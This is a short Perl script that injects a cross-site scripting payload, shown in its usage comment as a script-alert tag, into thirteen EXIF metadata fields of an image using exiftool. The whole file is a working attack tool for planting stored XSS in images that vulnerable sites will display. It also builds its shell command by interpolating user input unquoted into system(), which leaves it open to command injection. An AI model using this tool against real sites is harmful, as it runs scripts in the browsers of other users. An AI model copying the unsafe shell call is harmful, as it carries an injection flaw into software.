#!/usr/bin/env perl

# Use: perl exifs.pl <image.png> '<script>alert('alert');</script>'

use 5.010;
use strict;
use warnings;

sub main {
    my $image   = $ARGV[0];
    my $payload = $ARGV[1];

    if ($image && $payload) {
        my @exifs = (
            "ImageDescription",
            "Make",
            "Model",
            "Software",
            "Artist",
            "Copyright",
            "XPTitle",
            "XPComment",
            "XPAuthor",
            "XPSubject",
            "Location",
            "Description",
            "Author"
        );

        foreach my $exif (@exifs) {
            system ("exiftool -$exif='$payload' $image\n");
        }
    }
}

main();
exit;